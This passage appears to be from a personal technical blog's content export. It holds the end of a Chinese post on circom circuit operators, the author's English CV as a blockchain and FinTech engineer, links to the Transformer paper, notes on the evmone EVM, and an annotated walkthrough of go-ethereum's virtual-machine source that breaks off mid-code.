<p>​    您可能已经注意到，我们引入了两个新的运算符 : <code>&lt;--</code> 和 <code>===</code> 。<code>&lt;--</code> 和 <code>--&gt;</code> 操作符运算符只为信号分配一个值，而不创建任何约束。<code>===</code> 操作符添加约束而不分配值。如前所述，<code>&lt;==</code> 为信号分配一个值并添加一个约束。这意味着它只是 <code>&lt;--</code>和 <code>===</code> 的组合。但是，由于并非总是希望在同一步骤中同时完成这两个步骤，因此circom 的灵活性使我们可以将这一步分为两步。</p>
<p>​    事实证明，电路仍然存在一个细微的问题：由于运算是在有限域（Z_r）上进行的，因此我们需要确保乘法不会溢出。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>​    <a href="https://github.com/iden3/circomlib">circomlib</a> 写好了一些基本的电路，如：binaritzations、comparators, eddsa, hashes, merkle trees 等等。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>cv-en</title>
    <url>/1982/02/26/cv-en-2025/</url>
    <content><![CDATA[<h4 id="ZHUANG-WEIMING"><a href="#ZHUANG-WEIMING" class="headerlink" title="ZHUANG WEIMING"></a>ZHUANG WEIMING</h4><p>(Technology Leader | FinTech Innovator | Solution Expert)<br>📱 18642696200 | ✉️ <a href="mailto:&#x7a;&#119;&#109;&#49;&#51;&#x36;&#x32;&#48;&#48;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x7a;&#119;&#109;&#49;&#51;&#x36;&#x32;&#48;&#48;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a> | 🌐 <a href="https://zhuang-weiming.github.io/">Blog</a>  | GitHub: zhuang-weiming</p>
<hr>
<h4 id="PROFESSIONAL-SUMMARY"><a href="#PROFESSIONAL-SUMMARY" class="headerlink" title=" PROFESSIONAL SUMMARY"></a><img src="/1982/02/26/cv-en-2025/tec.svg" width="30px"> <strong>PROFESSIONAL SUMMARY</strong></h4><ul>
<li><strong>10+ years</strong> in <strong>FinTech innovation</strong>, <strong>vendor governance</strong>, and <strong>cross-border technology strategy</strong>, with deep expertise in blockchain, decentralized systems, AI and digital transformation.</li>
<li>Proven leader in <strong>vendor lifecycle management</strong>, including RFP processes, contract negotiations, compliance, and performance reviews. Recognized for aligning third-party solutions with enterprise goals at HSBC, Ant Financial, and IBM.</li>
<li><strong>Architect of FinTech solutions</strong> adopted globally: Led <a href="https://www.hkma.gov.hk/gb_chi/news-and-media/press-releases/2023/05/20230518-4/">e-HKD (Hong Kong CBDC)</a>, blockchain warehouse financing (Bank of Communications), and <a href="https://www.red-dot.org/project/hsbc-trusted-identity-reimagine-identities-for-a-collaborative-world-72122">decentralized identity (Red Dot Design Award 2024)</a>, UI Test Robot, etc..</li>
<li>Certified in <strong>Secure Code Warrior (Orange Belt)</strong>, <strong>PMP</strong>, and <strong>IREB CPRE</strong>. Adept at bridging technical innovation with regulatory compliance (CAICT, HKMA).  </li>
</ul>
<hr>
<h4 id="KEY-EXPERIENCES"><a href="#KEY-EXPERIENCES" class="headerlink" title=" KEY EXPERIENCES"></a><img src="/1982/02/26/cv-en-2025/exp.svg" width="30px"> <strong>KEY EXPERIENCES</strong></h4><h4 id="HSBC-Lab"><a href="#HSBC-Lab" class="headerlink" title="HSBC | Lab"></a><strong>HSBC | Lab</strong></h4><p><strong>Lead Full Stack Engineer | Dec 2021–Present</strong><br><em>Spearheading FinTech innovation for global banking markets</em>  </p>
<ul>
<li><strong>Technology Leadership</strong>: Directed development for HSBC’s blockchain/DID solutions, ensuring compliance with regulations. Technically negotiated contracts.</li>
<li><strong>Global Solution Integration</strong>: Launched <strong>e-HKD</strong> (Hong Kong’s CBDC pilot) and <strong>NFT platforms</strong> by adapting public FinTech frameworks.</li>
<li><strong>Award-Winning Innovation</strong>: <ul>
<li>Led decentralized identity (DID) project, winning <strong>2024 HSBC Tech Excellence Award</strong> and <strong>Red Dot Design Award</strong>.</li>
<li>Led team to win the HSBC Tech 2024 Reward &amp; Recognition, HSBC Tech Code Competition <strong>champion and runner-up</strong>.</li>
<li>Incubated an Angel Fund project within HSBC, UI Test Robot which can help designer teams (300 designers) to do UI test automatically.</li>
</ul>
</li>
<li><strong>Risk Management</strong>: Implemented IT governance frameworks for third-party AI / blockchain tools.  </li>
</ul>
<h4 id="Dalian-Commodity-Exchange-DCE-China"><a href="#Dalian-Commodity-Exchange-DCE-China" class="headerlink" title="Dalian Commodity Exchange (DCE) | China"></a><strong>Dalian Commodity Exchange (DCE) | China</strong></h4><p><strong>Lead Architect | Jul 2020–Dec 2021</strong><br><em>Pioneered blockchain solutions for commodity trading ecosystems</em>  </p>
<ul>
<li><strong>Technology Leadership</strong>: Integrate open-source, vendor solution to make new blockchain platform happen in China regulated environment.</li>
<li><strong>Regulatory Collaboration</strong>: <a href="https://www.dljrylhh.org.cn/gzdt/2021-11-18/705.html">Partnered with CAICT to pass <strong>Trusted Blockchain Certification</strong> (2021)</a>, ensuring compliance with Chinese financial regulations.</li>
<li><strong>Cross-Border Financing</strong>: Designed blockchain warehouse receipt system adopted by <a href="https://finance.sina.com.cn/money/future/fmnews/2021-04-08/doc-ikmxzfmk5614473.shtml">Bank of Communications and COFCO, enabling trade financing</a>.</li>
</ul>
<h4 id="Shanghai-Insurance-Exchange-SHIE-China"><a href="#Shanghai-Insurance-Exchange-SHIE-China" class="headerlink" title="Shanghai Insurance Exchange (SHIE) | China"></a><strong>Shanghai Insurance Exchange (SHIE) | China</strong></h4><p><strong>Technical Lead | Apr 2017–Jun 2020</strong><br><em>Drove InsurTech innovation through third-party partnerships</em></p>
<ul>
<li>Led the engineering team to research and develop a blockchain product - <a href="https://www.shie.com.cn/iec/iecPC.html">SHIE Blockchain</a>, and it successfully passed the <strong>CAICT(The China Academy of Information and Communications Technology) rating in the 1st wave</strong>.</li>
<li><strong>Innovation with Multi-Insurance/Annuity Companies</strong>: Collaborated with 10+ insurance/annuity companies to deploy SHIE Blockchain (CAICT-certified), reducing annuity transfer processing time by 40%.</li>
<li><strong>Award Recognition</strong>: <ul>
<li>Won <strong>1st Prize, Shanghai Innovation Competition 2018</strong> for reinsurance blockchain solution. </li>
<li><strong>First Prize of Outstanding Research Achievements</strong> in the Reform and Development of Shanghai’s Financial Industry 2018-2019.</li>
</ul>
</li>
</ul>
<h4 id="Ant-Financial-China"><a href="#Ant-Financial-China" class="headerlink" title="Ant Financial | China"></a><strong>Ant Financial | China</strong></h4><p><strong>Blockchain Expert | Jul 2016–Mar 2017</strong><br><em>Launched Ant Chain’s first charitable donation platform</em>  </p>
<ul>
<li><strong>Collaboration and Integration</strong>: Partnered with Red Cross, Onefoundation, and Alipay to scale blockchain application, supporting hundreds of transactions daily.</li>
<li><strong>Thought Leadership</strong>: Represented Ant at MIIT Blockchain Conference, shaping <a href="http://cj.sina.com.cn/article/detail/2136703197/84145">China’s pioneer and regulatory blockchain dialogue organized by the Ministry of Industry and Information Technology (MIIT)</a>.</li>
</ul>
<h4 id="IBM-Global"><a href="#IBM-Global" class="headerlink" title="IBM | Global"></a><strong>IBM | Global</strong></h4><p><strong>Innovation Consultant &amp; Senior Architect | May 2007–Jul 2016</strong><br><em>Advised Fortune 500 clients on FinTech/digital transformation</em></p>
<ul>
<li><strong>Technology expert</strong>: Led solutions for ICBC’s mobile banking MVP,  through agile methodology and partnerships. Recognized as IBM certificated Experienced Level in IT Application Consulting &amp; Cross Industry specializations, 2014. Seasoned developer and architect with experience as a full stack engineer, including workflow, iOS, DB2, IBM cloud, etc..</li>
<li><strong>Compliance Expertise</strong>: Trained Bank of China (HK) on blockchain frameworks on the domain of technology and regulation.</li>
<li><strong>volunteer:</strong> I was a volunteer in the <a href="https://zhuang-weiming.github.io/2010/11/04/ghana-day-29/">IBM CSC Program in October 2010, Ghana Team 5</a>.</li>
</ul>
<hr>
<h4 id="ACCOMPLISHMENTS"><a href="#ACCOMPLISHMENTS" class="headerlink" title=" ACCOMPLISHMENTS"></a><img src="/1982/02/26/cv-en-2025/publish.svg" width="30px"> <strong>ACCOMPLISHMENTS</strong></h4><ul>
<li><strong>Patents</strong>: <strong>13</strong> filed/granted in blockchain / AI / governance, e.g.:<ul>
<li> <a href="https://patents.google.com/patent/WO2024011917A1/en">Delegate model for blockchain transactions (2022  CN, 2023  WO)</a> </li>
<li><a href="https://patents.google.com/patent/WO2024057150A1">User verification with non-fungible tokens (2023 WO US)</a> </li>
<li><a href="https://patents.google.com/patent/WO2018171539A1/en">Method and device for processing service request (2017  CN TW 2018  MY WO ES KR AU MX RU CA PL EP JP 2019  PH US)</a></li>
<li><a href="https://patents.google.com/patent/WO2018183148A1/en">Method, apparatus, and system for blockchain consensus (2017  CN TW 2018  MX KR WO SG EP AU US JP CA BR RU 2019  ZA PH AU 2020  US 2021  US)</a></li>
</ul>
</li>
<li><strong>Publications</strong>: <a href="https://xueshu.baidu.com/usercenter/paper/show?paperid=4d51a8c9eef67cf1e7f2f695ec2dd533&site=xueshu_se">Authored Blockchain in Insurance (China FinTech Journal)</a> , CAICT-certified whitepapers, Blockchain Practical Application Methodology in Small and Middle Insurance Enterprise on “Modern Bankers”, etc..</li>
<li><strong>Awards</strong>: Coach team to win Red Dot Design Award 2024, HSBC Tech Excellence Award, Shanghai Innovation 1st Prize, etc..</li>
<li><strong>Certifications</strong>: @PMP(2010-2013), @IREB CPRE, @Secure Code Warrior (Orange Belt), etc..</li>
</ul>
<hr>
<h4 id="EDUCATION"><a href="#EDUCATION" class="headerlink" title=" EDUCATION"></a><img src="/1982/02/26/cv-en-2025/graduation-cap-solid.svg" width="30px"> <strong>EDUCATION</strong></h4><p><strong>Dalian Maritime University</strong><br>Master &amp; Bachelor of Electrical Engineering | 2000–2007</p>
]]></content>
      <tags>
        <tag>cv</tag>
      </tags>
  </entry>
  <entry>
    <title>Transformer论文学习</title>
    <url>/2023/01/16/Transformer%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<ul>
<li><p>Transformer论文逐段精读 ==&gt; Youtube <a href="https://www.youtube.com/watch?v=nzqlFIcCSWQ%EF%BC%8CBilibili">https://www.youtube.com/watch?v=nzqlFIcCSWQ，Bilibili</a> <a href="http://b23.tv/7fUGUv2">http://b23.tv/7fUGUv2</a></p>
</li>
<li><p>论文位置 “Attention Is All You Need” ==&gt; <a href="https://arxiv.org/pdf/1706.03762.pdf">https://arxiv.org/pdf/1706.03762.pdf</a></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>evmone说明</title>
    <url>/2019/11/07/evmone%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<p>首先介绍一个人<a href="https://github.com/chfast">chfast</a>，他同时是 <a href="https://github.com/ethereum/evmone">evmone</a>， <a href="https://github.com/ewasm/hera">hera</a>， <a href="https://github.com/ethereum/evmc">evmc</a> 等项目的主要作者。</p>
<ul>
<li><p>evmone是以太坊虚拟机（EVM）的C ++实现；</p>
</li>
<li><p>旨在实现整洁的，独立的EVM实现，可以将其作为以太坊客户端项目的执行模块导入；</p>
</li>
<li><p>evmone的代码库经过优化，可提供快速有效的EVM智能合约执行。</p>
</li>
</ul>
<p>同hera在geth上的整合方法一样，evmone也可以通过evmc接口整合至geth，成为geth的外接evm。需要使用  <a href="https://github.com/ewasm/go-ethereum/releases">binary releases of geth with EVMC support</a> 版本的geth。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth --vm.evm=./libevmone.so</span><br></pre></td></tr></table></figure>

<p><strong>通过<a href="https://github.com/ewasm/benchmarking">ewasm工作组的测试</a>显示，<a href="https://github.com/ethereum/evmone">evmone</a>的性能大大优于<a href="https://github.com/ethereum/go-ethereum">geth原生的evm</a>、<a href="https://github.com/cryptape/cita-vm/blob/master/README.md">cita</a>以及<a href="https://github.com/paritytech/parity-ethereum">parity-evm</a>。</strong></p>
<p><em>目前还没有找到 evmone 与 hera 的性能对比测试结果。待后续对比完成后，补齐。</em></p>
]]></content>
      <tags>
        <tag>wasm</tag>
      </tags>
  </entry>
  <entry>
    <title>EVM之源码分析</title>
    <url>/2019/03/20/evm%E4%B9%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>ethereum的虚拟机源码所有部分在core/vm下。 去除测试总共有24个源码文件。 整个vm调用的入口在go-ethereum/core/state_transaction.go中。 我们主要是为了分析虚拟机源码，所以关于以太坊是如何进行交易转账忽略过去。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(st *StateTransition)</span> <span class="title">TransitionDb</span><span class="params">()</span> <span class="params">(ret []<span class="keyword">byte</span>, usedGas <span class="keyword">uint64</span>, failed <span class="keyword">bool</span>, err error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err = st.preCheck(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	msg := st.msg</span><br><span class="line">	sender := vm.AccountRef(msg.From())</span><br><span class="line">	homestead := st.evm.ChainConfig().IsHomestead(st.evm.BlockNumber)</span><br><span class="line">	contractCreation := msg.To() == <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pay intrinsic gas</span></span><br><span class="line">gas, err := IntrinsicGas(st.data, contractCreation, homestead)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, <span class="number">0</span>, <span class="literal">false</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = st.useGas(gas); err != <span class="literal">nil</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, <span class="number">0</span>, <span class="literal">false</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	evm = st.evm</span><br><span class="line">	<span class="comment">// vm errors do not effect consensus and are therefor</span></span><br><span class="line">	<span class="comment">// not assigned to err, except for insufficient balance</span></span><br><span class="line">	<span class="comment">// error.</span></span><br><span class="line">	vmerr error</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> contractCreation &#123;</span><br><span class="line">	ret, _, st.gas, vmerr = evm.Create(sender, st.data, st.gas, st.value)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// Increment the nonce for the next transaction</span></span><br><span class="line">	st.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+<span class="number">1</span>)</span><br><span class="line">	ret, st.gas, vmerr = evm.Call(sender, st.to(), st.data, st.gas, st.value)</span><br><span class="line">&#125;</span><br><span class="line">.........</span><br></pre></td></tr></table></figure>

<p>从上面的截图我们可以看出， 当以太坊的交易中to地址为nil时， 意味着部署合约， 那么就会调用evm.Create方法。 否则调用了evm.Call方法。 也就是说分析以太坊虚拟机源码时， 只要从这两个函数作为入口即可。</p>
<p>首先我们先看一下EVM数据结构:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> EVM <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// Context provides auxiliary blockchain related information</span></span><br><span class="line">	Context</span><br><span class="line">	<span class="comment">// StateDB是状态存储接口。 这个接口非常重要。 可以肯定的说evm中的大部分工作都是围绕这次接口进行的。</span></span><br><span class="line">	StateDB StateDB</span><br><span class="line">	<span class="comment">// 记录当前调用的深度</span></span><br><span class="line">	depth <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 记录链的配置 主要是以太坊经理过几次分叉和提案 为了兼容之前的区块信息</span></span><br><span class="line"> 	<span class="comment">// 所以做了一些兼容 移植的时候我们只考虑最新版本的内容</span></span><br><span class="line">	chainConfig *params.ChainConfig</span><br><span class="line">	<span class="comment">// 这个参数 对我们移植过程中的意义不是很大</span></span><br><span class="line">	chainRules params.Rules</span><br><span class="line">	<span class="comment">// 这个是虚拟机的一些配置参数 是创建解释器的初始化参数 比如所有操作码对应的函数也是在此处配置的</span></span><br><span class="line">	vmConfig Config</span><br><span class="line"> 	<span class="comment">// 解释器对象 它是整个进行虚拟机代码执行的地方。</span></span><br><span class="line">	interpreter *Interpreter</span><br><span class="line"> 	 <span class="comment">// 用来终止代码执行</span></span><br><span class="line">	abort <span class="keyword">int32</span></span><br><span class="line">	<span class="comment">// callGasTemp holds the gas available for the current call. This is needed because the</span></span><br><span class="line">	<span class="comment">// available gas is calculated in gasCall* according to the 63/64 rule and later</span></span><br><span class="line">	<span class="comment">// applied in opCall*.</span></span><br><span class="line">	callGasTemp <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看一看创建EVM的方法</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewEVM</span><span class="params">(ctx Context, statedb StateDB, chainConfig *params.ChainConfig, vmConfig Config)</span> *<span class="title">EVM</span></span> &#123;</span><br><span class="line">	evm := &amp;EVM&#123;</span><br><span class="line">		Context:     ctx,</span><br><span class="line">		StateDB:     statedb,</span><br><span class="line">		vmConfig:    vmConfig,</span><br><span class="line">		chainConfig: chainConfig,</span><br><span class="line">		chainRules:  chainConfig.Rules(ctx.BlockNumber),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主要看这个地方 创建解释器 解释器是执行字节码的关键</span></span><br><span class="line">	evm.interpreter = NewInterpreter(evm, vmConfig)</span><br><span class="line">	<span class="keyword">return</span> evm</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewInterpreter</span><span class="params">(evm *EVM, cfg Config)</span> *<span class="title">Interpreter</span></span> &#123;</span><br><span class="line">  <span class="comment">// 在这里设置 操作码对应的函数 </span></span><br><span class="line">  <span class="comment">// 主要原因是以太坊经历版本迭代之后 操作码有了一些变化</span></span><br><span class="line">  <span class="comment">// 我们移植的时候 这个地方只会保留最新版本的操作码表</span></span><br><span class="line">	<span class="keyword">if</span> !cfg.JumpTable[STOP].valid &#123;</span><br><span class="line">		<span class="keyword">switch</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> evm.ChainConfig().IsConstantinople(evm.BlockNumber):</span><br><span class="line">			cfg.JumpTable = constantinopleInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.ChainConfig().IsByzantium(evm.BlockNumber):</span><br><span class="line">			cfg.JumpTable = byzantiumInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.ChainConfig().IsHomestead(evm.BlockNumber):</span><br><span class="line">			cfg.JumpTable = homesteadInstructionSet</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			cfg.JumpTable = frontierInstructionSet</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;Interpreter&#123;</span><br><span class="line">		evm:      evm,</span><br><span class="line">		cfg:      cfg,</span><br><span class="line">		<span class="comment">// gas表中记录了对应的执行操作需要花费的gas 移植的时候我们只保留一个</span></span><br><span class="line">		gasTable: evm.ChainConfig().GasTable(evm.BlockNumber),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们先分析部署合约的入口， 看一看整个合约部署的流程。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Create creates a new contract using code as deployment code.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span> <span class="title">Create</span><span class="params">(caller ContractRef, code []<span class="keyword">byte</span>, gas <span class="keyword">uint64</span>, value *big.Int)</span> <span class="params">(ret []<span class="keyword">byte</span>, contractAddr common.Address, leftOverGas <span class="keyword">uint64</span>, err error)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 首先检测当前evm执行的深度 默认不应该超过1024  </span></span><br><span class="line">	<span class="keyword">if</span> evm.depth &gt; <span class="keyword">int</span>(params.CallCreateDepth) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, gas, ErrDepth</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 这个函数我们不在追踪 其功能就是检测是否调用方的金额大约value</span></span><br><span class="line">	<span class="keyword">if</span> !evm.CanTransfer(evm.StateDB, caller.Address(), value) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, gas, ErrInsufficientBalance</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 首先获取调用者的nonce 然后再更新调用者的nonce  这个如果熟悉以太坊交易流程的话应该知道nonce的作用。</span></span><br><span class="line">	nonce := evm.StateDB.GetNonce(caller.Address())</span><br><span class="line">	evm.StateDB.SetNonce(caller.Address(), nonce+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 下面这三句就是根据调用者地址 调用者nonce创建合约账户地址 并且判断是否这个合约地址确实没有部署过合约</span></span><br><span class="line">	contractAddr = crypto.CreateAddress(caller.Address(), nonce)</span><br><span class="line">	contractHash := evm.StateDB.GetCodeHash(contractAddr)</span><br><span class="line">	<span class="keyword">if</span> evm.StateDB.GetNonce(contractAddr) != <span class="number">0</span> || (contractHash != (common.Hash&#123;&#125;) &amp;&amp; contractHash != emptyCodeHash) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, <span class="number">0</span>, ErrContractAddressCollision</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 既然已经创建好了合约地址 那么就要为这个合约地址创建账户体系</span></span><br><span class="line">	snapshot := evm.StateDB.Snapshot()</span><br><span class="line">	<span class="comment">// 所以下面这个函数在一直的时候我们的工作内容之一</span></span><br><span class="line">	evm.StateDB.CreateAccount(contractAddr)</span><br><span class="line">	<span class="keyword">if</span> evm.ChainConfig().IsEIP158(evm.BlockNumber) &#123;</span><br><span class="line">		evm.StateDB.SetNonce(contractAddr, <span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	evm.Transfer(evm.StateDB, caller.Address(), contractAddr, value)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建一个合约对象 设置合约对象的参数 比如调用者 合约代码 合约hash的内容 </span></span><br><span class="line">	contract := NewContract(caller, AccountRef(contractAddr), value, gas)</span><br><span class="line">	contract.SetCallCode(&amp;contractAddr, crypto.Keccak256Hash(code), code)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> evm.vmConfig.NoRecursion &amp;&amp; evm.depth &gt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, contractAddr, gas, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> evm.vmConfig.Debug &amp;&amp; evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">		evm.vmConfig.Tracer.CaptureStart(caller.Address(), contractAddr, <span class="literal">true</span>, code, gas, value)</span><br><span class="line">	&#125;</span><br><span class="line">	start := time.Now()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将evm对象 合约对象传入run函数开始执行 此函数是核心 等一会分析到Call入口的时候最终也会调用此函数</span></span><br><span class="line">	ret, err = run(evm, contract, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上述函数执行完成后返回的就是我前一章所说的初始化后的合约代码</span></span><br><span class="line">  <span class="comment">// 也就是我们在remix上看到runtime的字节码 以后调用合约代码其实质就是</span></span><br><span class="line">  <span class="comment">// 执行返回后的代码</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 下面的流程主要是一些检查 把返回的字节码保存到此合约账户名下 这样以后调用合约代码才能加载成功</span></span><br><span class="line">	maxCodeSizeExceeded := evm.ChainConfig().IsEIP158(evm.BlockNumber) &amp;&amp; <span class="built_in">len</span>(ret) &gt; params.MaxCodeSize</span><br><span class="line">	<span class="comment">// if the contract creation ran successfully and no errors were returned</span></span><br><span class="line">	<span class="comment">// calculate the gas required to store the code. If the code could not</span></span><br><span class="line">	<span class="comment">// be stored due to not enough gas set an error and let it be handled</span></span><br><span class="line">	<span class="comment">// by the error checking condition below.</span></span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; !maxCodeSizeExceeded &#123;</span><br><span class="line">		createDataGas := <span class="keyword">uint64</span>(<span class="built_in">len</span>(ret)) * params.CreateDataGas</span><br><span class="line">		<span class="keyword">if</span> contract.UseGas(createDataGas) &#123;</span><br><span class="line">			evm.StateDB.SetCode(contractAddr, ret)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			err = ErrCodeStoreOutOfGas</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// When an error was returned by the EVM or when setting the creation code</span></span><br><span class="line">	<span class="comment">// above we revert to the snapshot and consume any gas remaining. Additionally</span></span><br><span class="line">	<span class="comment">// when we&#x27;re in homestead this also counts for code storage gas errors.</span></span><br><span class="line">	<span class="keyword">if</span> maxCodeSizeExceeded || (err != <span class="literal">nil</span> &amp;&amp; (evm.ChainConfig().IsHomestead(evm.BlockNumber) || err != ErrCodeStoreOutOfGas)) &#123;</span><br><span class="line">		evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">		<span class="keyword">if</span> err != errExecutionReverted &#123;</span><br><span class="line">			contract.UseGas(contract.Gas)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Assign err if contract code size exceeds the max while the err is still empty.</span></span><br><span class="line">	<span class="keyword">if</span> maxCodeSizeExceeded &amp;&amp; err == <span class="literal">nil</span> &#123;</span><br><span class="line">		err = errMaxCodeSizeExceeded</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> evm.vmConfig.Debug &amp;&amp; evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">		evm.vmConfig.Tracer.CaptureEnd(ret, gas-contract.Gas, time.Since(start), err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret, contractAddr, contract.Gas, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们下面就开始主要分析run函数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">(evm *EVM, contract *Contract, input []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> contract.CodeAddr != <span class="literal">nil</span> &#123;</span><br><span class="line">	  <span class="comment">// 首先会进入下面这个代码执行  它会根据给定的合约地址来判断是否是以太坊内部已经保存的合约</span></span><br><span class="line">	  <span class="comment">// 如果是创建新合约 肯定不是内置合约</span></span><br><span class="line">		precompiles := PrecompiledContractsHomestead</span><br><span class="line">		<span class="keyword">if</span> evm.ChainConfig().IsByzantium(evm.BlockNumber) &#123;</span><br><span class="line">			precompiles = PrecompiledContractsByzantium</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> p := precompiles[*contract.CodeAddr]; p != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> RunPrecompiledContract(p, input, contract)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 所以最后我们最终到这里 此时input参数为nil</span></span><br><span class="line">	<span class="keyword">return</span> evm.interpreter.Run(contract, input)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解释器的Run函数才是真正执行合约代码的地方</span></span><br><span class="line"><span class="comment">// 为了凸显主流程 我们隐藏部分内容</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(in *Interpreter)</span> <span class="title">Run</span><span class="params">(contract *Contract, input []<span class="keyword">byte</span>)</span> <span class="params">(ret []<span class="keyword">byte</span>, err error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> in.intPool == <span class="literal">nil</span> &#123;</span><br><span class="line">		in.intPool = poolOfIntPools.get()</span><br><span class="line">		<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			poolOfIntPools.put(in.intPool)</span><br><span class="line">			in.intPool = <span class="literal">nil</span></span><br><span class="line">		&#125;()</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 下面这些变量应该说满足了一个字节码执行的所有条件</span></span><br><span class="line">	<span class="comment">// 有操作码 内存 栈 PC计数器 </span></span><br><span class="line">	<span class="comment">// 强烈建议使用debug工具去跟踪一遍执行的流程 </span></span><br><span class="line">	<span class="comment">// 其实它的执行流程就和上一章我们人肉执行的流程一样</span></span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		op    OpCode        <span class="comment">// current opcode</span></span><br><span class="line">		mem   = NewMemory() <span class="comment">// bound memory</span></span><br><span class="line">		stack = newstack()  <span class="comment">// local stack</span></span><br><span class="line">		pc   = <span class="keyword">uint64</span>(<span class="number">0</span>) <span class="comment">// program counter</span></span><br><span class="line">		cost <span class="keyword">uint64</span></span><br><span class="line">		pcCopy  <span class="keyword">uint64</span> <span class="comment">// needed for the deferred Tracer</span></span><br><span class="line">		gasCopy <span class="keyword">uint64</span> <span class="comment">// for Tracer to log gas remaining before execution</span></span><br><span class="line">		logged  <span class="keyword">bool</span>   <span class="comment">// deferred Tracer should ignore already logged steps</span></span><br><span class="line">	)</span><br><span class="line">	contract.Input = 